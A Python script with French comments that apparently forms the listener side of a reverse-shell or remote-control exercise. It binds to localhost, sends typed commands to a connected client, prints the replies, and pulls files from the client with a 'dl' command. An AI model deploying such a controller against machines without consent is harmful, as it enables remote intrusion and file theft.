import socket

HOST_IP = "127.0.0.1"
HOST_PORT = 32000
MAX_DATA_SIZE = 1024

def socket_receive_all_data(socket_p, data_len):
    current_data_len = 0
    total_data = None
    # print("socket_receive_all_data len:", data_len)

    while current_data_len < data_len:
        chunk_len = data_len - current_data_len # chunk veut dire le morceau
        if chunk_len > MAX_DATA_SIZE:
            chunk_len = MAX_DATA_SIZE
            
        data = socket_p.recv(MAX_DATA_SIZE)
        # print("  len:", len(data))
        
        if not data:
            return None
        if not total_data:
            total_data = data
        else:
            total_data += data
        current_data_len += len(data)
        # print("  total len:", current_data_len, "/", data_len)

    return total_data
    
def socket_send_command_and_receive_all_data(socket_p, command):
    if not command:
        return None
    socket_p.sendall(command.encode())
    
    header_data = socket_receive_all_data(socket_p, 13)
    data_size = int(header_data.decode())
    
    datas_recues = socket_receive_all_data(socket_p, data_size)
    return datas_recues


s = socket.socket()
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) # Permet de réutiliser l'adresse du socket

s.bind((HOST_IP, HOST_PORT))
s.listen()

print(f"Attente de connexion sur {HOST_IP}, port {HOST_PORT}...")
connection_socket, client_adress = s.accept()
print(f"Connexion établie avec le client {client_adress}")

dl_filename = None

while True:
    infos_data = socket_send_command_and_receive_all_data(connection_socket, "infos")
    if not infos_data:
        break
    command = input(client_adress[0] + ":" + str(client_adress[1]) + " " + infos_data.decode() + " >")
    
    command_split = command.split(" ")
    
    if len(command_split) == 2 and command_split[0] == "dl":
        dl_filename = command_split[1]

    datas_recues = socket_send_command_and_receive_all_data(connection_socket, command)
    if not datas_recues:
        break
    
    if dl_filename:
        f=open(dl_filename, "wb")
        f.write(datas_recues)
        f.close()
        print("Fichier", dl_filename, "téléchargé")
        dl_filename = None
    else:
        print(datas_recues.decode())
    
    
    
s.close()
connection_socket.close()